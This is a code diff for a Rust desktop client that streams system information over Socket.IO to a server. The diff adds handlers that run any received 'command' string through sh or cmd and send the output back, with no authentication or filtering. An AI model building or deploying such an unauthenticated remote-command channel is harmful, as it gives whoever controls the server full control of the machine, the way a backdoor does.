@@ -6,12 +6,12 @@ use reqwest_cookie_store::{CookieStore, CookieStoreMutex};
 use serde::{Deserialize, Serialize};
 use sysinfo::*;
 use serde_json::Value;
-use tokio::{io::{self, ErrorKind}, runtime::Handle, spawn};
+use tokio::{io::{self, ErrorKind}, process::Child, runtime::Handle, spawn};
 use crossbeam::channel;
 use regex::Regex;
 use num_format::{Locale, ToFormattedString};
 use futures_util::FutureExt;
-use shell_words::{join, split, quote};
+use shell_words::{join, quote, split, ParseError};
 use serde_json::json;
 use sysinfo::{Components, CpuRefreshKind, Disks, Networks, RefreshKind, System};
 use tokio::{sync::{mpsc, Mutex}, time::{self, sleep}};
@@ -19,6 +19,7 @@ use rust_socketio::{
     asynchronous::{Client as SocketClient, ClientBuilder},
     Payload
 };
+use uuid::Uuid;
 
 use crate::{data::{ComputerData, DriveData, SystemInformation}, ticket_request::request::request_seb_info};
 
@@ -93,7 +94,7 @@ impl WebSocket {
     }
 
     async fn on_message(&mut self, payload: Payload, socket: SocketClient) {
-        println!("message: {:#?}", payload);
+        println!("error: {:#?}", payload);
         socket
             .emit("disconnect", "received message")
             .await
@@ -302,106 +303,150 @@ impl ComputerData{
         Ok(antivirus_exists)
     }
 
-    pub fn initiate_websocket(run_once: &mut bool) {
+    pub fn initialize_websocket(client_uuid: Uuid)-> String{
         let app: Arc<Mutex<WebSocket>> = Arc::new(Mutex::new(WebSocket::new()));
         let event_app: Arc<Mutex<WebSocket>> = app.clone();
 
+        // let mut response = String::new();
+
         tokio::spawn(async move{
             let socket = ClientBuilder::new(URL)
-            .transport_type(rust_socketio::TransportType::Websocket)
-            .namespace("/ws") // .opening_header("jwt", cookie.unwrap_or("Nil"))
-            .on("open", |_, client| async move{
-                client.emit("join", json!({"room": "RIV"})).await.unwrap();
-            }.boxed())
-            .on("connect", |_, client| async move{
-                client.emit("join", json!({"room": "RIV"})).await.unwrap();
-            }.boxed())
-            .on("close", |_, client| async move { 
-                sleep(Duration::from_secs(3)).await;
-                client.emit("join", json!({"room": "RIV"})).await.unwrap();
-                println!("Disconnected");
-            }.boxed())
-            .on("join", |msg, _| async move { println!("Joined") }.boxed())
-            .on("command", | payload: Payload, client: SocketClient | async move {
-                match payload{
-                    Payload::Binary(bin_payload) => {
-                        println!("bin_payload: {:#?}", bin_payload);
-                        let command_payload = split(str::from_utf8(&bin_payload.to_vec()).unwrap());
-                        // let command_payload = split(bin_payload.to_vec().);
-    
-                        let process: std::process::Output = std::process::Command::new("sh")
-                            .arg("-c")
-                            .args(command_payload.unwrap())
-                            .stdout(Stdio::piped())
-                            .spawn()
-                            .unwrap()
-                            .wait_with_output()
-                            .unwrap();
-    
-                    let _ = client.emit("clientCmdResponse", json!({"message": process.stdout}));
-                        // println!("{bin_payload:#?}");
-                    },
-                    Payload::String(string_payload) => {
-                       Self::handle_command_payload(string_payload, client).await;
+                .transport_type(rust_socketio::TransportType::Websocket)
+                .namespace("/ws") // .opening_header("jwt", cookie.unwrap_or("Nil"))
+                .on("open", |_, client| async move{
+                    client.emit("join", json!({"room": "RIV"})).await.unwrap();
+                }.boxed())
+                .on("connect", |_, client| async move{
+                    client.emit("join", json!({"room": "RIV"})).await.unwrap();
+                }.boxed())
+                .on("close", |_, client| async move { 
+                    sleep(Duration::from_secs(3)).await;
+                    client.emit("join", json!({"room": "RIV"})).await.unwrap();
+                    println!("Disconnected");
+                }.boxed())
+                .on("join", |msg, _| async move { println!("Joined") }.boxed())
+                .on("command", | payload: Payload, client: SocketClient | async move {
+                    match payload{
+                        Payload::Binary(bin_payload) => { println!("bin_payload: {:#?}", bin_payload); },
+                        Payload::String(string_payload) => { Self::handle_command_payload(string_payload, client).await; }
                     }
-                }
-            }.boxed())
-            .on("message", move|msg, client| {
-                let x = event_app.clone();
-                async move { x.lock().await.on_message(msg, client).await }.boxed()
-            })
-            .on("error", |err, _| {
-                async move { eprintln!("Error: {:#?}", err) }.boxed()
-            })
-            .connect()
-            .await
-            .expect("Connection failed");
-    
-        socket.emit("join", json!({"room": "RIV"})).await.unwrap();
-        // socket.emit("command", json!({"command": "LIST", "room": "RIV"})).await.unwrap();
-        // let msg: Vec<u8> = "hello from client".as_bytes().to_vec();
-        let systeminfo = Self::get_sysinfo().await;
-
-        let json_payload = json!({
-            "room": "RIV",
-            "sysinfo": systeminfo,
-            "hostname": systeminfo.hostname
-        }); 
+                }.boxed())
+                .on("error", move|err, client| {
+                    let x = event_app.clone();
+                    async move { x.lock().await.on_message(err, client).await }.boxed()
+                })
+                .on("message", |msg, _| {
+                    async move { debug!("Received message: {:#?}", msg) }.boxed()
+                })
+                .connect()
+                .await
+                .expect("Connection failed");
+            
         
-        // Spawn a task or run a loop that listens for a shutdown signal
-        // tokio::spawn(async move {
-        loop{
-            sleep(Duration::from_secs(1)).await;
+            socket.emit("join", json!({"room": "RIV"})).await.unwrap();
+            // socket.emit("command", json!({"command": "LIST", "room": "RIV"})).await.unwrap();
+            // let msg: Vec<u8> = "hello from client".as_bytes().to_vec();
 
-            let socket_event = socket.emit("clientSysInfo", json_payload.clone())
-                .await;
-            match socket_event{
-                Ok(_) => info!("Received Socket event"),
-                Err(err) => debug!("SocketIO error: {err:?}"),
+            
+            // Spawn a task or run a loop that listens for a shutdown signal
+            // tokio::spawn(async move {
+            loop{
+                sleep(Duration::from_secs(1)).await;
+
+                let systeminfo = Self::get_sysinfo().await;
+
+                let json_payload = json!({
+                    "room": "RIV",
+                    "sysinfo": systeminfo,
+                    "client_uuid": client_uuid.to_string()
+                }); 
+
+                let socket_event = socket.emit("clientSysInfo", json_payload.clone())
+                    .await;
+                match socket_event{
+                    Ok(_) => {
+                        info!("Received Socket event");
+                    },
+                    Err(err) => {
+                        debug!("SocketIO error: {:?}", err);
+                    },
+                }
+
+                debug!("in loop");
+
+                if app.lock().await.finish {
+                    break;
+                }
             }
-
-            debug!("in loop");
-
-            if app.lock().await.finish {
-                break;
-            }
-        }
-        // });
-        socket.disconnect().await.unwrap();
+            socket.disconnect().await.unwrap();
         });
        
+       return format!("Socket connected");
     }
     
-    async fn handle_command_payload(string_payload: String, client: SocketClient) {
+    async fn handle_websocket(){
+        
+    }
+
+    async fn handle_command_payload(string_payload: String, client: SocketClient) 
+    { // -> Result<Vec<String>, ParseError>
         println!("string_payload: {}", string_payload.clone());
         if string_payload.contains("cd"){
             // TODO: need to find a way to keep track of current directory using this
             // std::env::set_current_dir(&path)
         }
-        let command_payload = split(string_payload.as_str());
+        let command_payload = split(string_payload.as_str()).unwrap();
+        if cfg!(target_os = "windows"){
+            let _ = Self::handle_windows_cmd(command_payload, client).await;
+        }else if cfg!(target_os = "linux"){
+            let _ = Self::handle_linux_cmd(command_payload, client).await;
+        }
+
+        
+    }
+
+    async fn handle_windows_cmd(command_payload: Vec<String>, client: SocketClient)
+    { // -> Result<Child, dyn Error>
+        let process = tokio::process::Command::new("cmd")
+        .arg("/C")
+        .args(command_payload)
+        .stdout(Stdio::piped())
+        .spawn();
+        
+        match process{
+            Ok(child) => {
+                let output = child
+                    .wait_with_output()
+                    .await;
+                
+                match output{
+                    Ok(out) => {
+                        let result: Vec<u8> = out.stdout;
+
+                        let socket_emit = client.emit(
+                        "clientCmdResponse", 
+                        json!({"message": String::from_utf8(result).unwrap()})
+                        ).await;
+
+                        match socket_emit{
+                            Ok(_) => info!("Emit socket event successfully"),
+                            Err(e) => debug!("Error emitting socket event: {e:?}"),
+                        }
+                    },
+                    Err(e) => debug!("Error reading Output => {e:?}")
+                }
+            },
+            Err(err) =>{
+                debug!("Error in process => {err:?}");
+            },
+        }
+    }
+
+    async fn handle_linux_cmd(command_payload: Vec<String>, client: SocketClient)
+    { // -> Result<Child, dyn Error>
         let process = tokio::process::Command::new("sh")
             .arg("-c")
-            .args(command_payload.unwrap())
+            .args(command_payload)
             .stdout(Stdio::piped())
             .spawn();
             
@@ -433,6 +478,8 @@ impl ComputerData{
             },
         }
     }
+
+
     async fn get_sysinfo() -> SystemInformation {
         let mut sys = System::new_all();
         // First we update all information of our `System` struct.
@@ -492,7 +539,7 @@ impl ComputerData{
     
         let sysinf: SystemInformation;
         //loop{
-        std::thread::sleep(Duration::from_millis(600));
+        std::thread::sleep(Duration::from_millis(200));
     
         s.refresh_cpu(); // Refreshing CPU information.
         for cpu in s.cpus() {
@@ -514,9 +561,7 @@ impl ComputerData{
             number_of_cpus,
             network_interfaces,
         };
-    
-        println!("SystemInfo: \n{sysinf}");
-    
+        // println!("SystemInfo: \n{sysinf}");
         return sysinf;
         //}
     }
